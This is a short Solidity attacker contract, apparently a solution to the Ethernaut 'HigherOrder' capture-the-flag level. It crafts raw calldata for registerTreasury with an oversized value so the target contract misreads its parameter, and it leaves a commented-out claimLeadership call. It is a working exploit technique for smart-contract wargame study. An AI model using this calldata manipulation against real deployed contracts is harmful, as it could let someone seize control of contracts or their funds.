// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IHigherOrder{
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}
contract HigherOrderAttacker {
    function attack(address _targetAddress) external{
        bytes memory data = abi.encodePacked(
            IHigherOrder.registerTreasury.selector, //Bytes 0-4
            uint8(255), // Bytes 4-11 the parameter uint8
            uint248(1) // Additional bytes with a value one so when uint256 is read value > 255
        );
        (bool success, bytes memory result) = _targetAddress.call(data);
        // this will not pass the level since the player should be the owner so call the function from console
        // if(success){
        //     IHigherOrder(_targetAddress).claimLeadership();
        // }
    }
}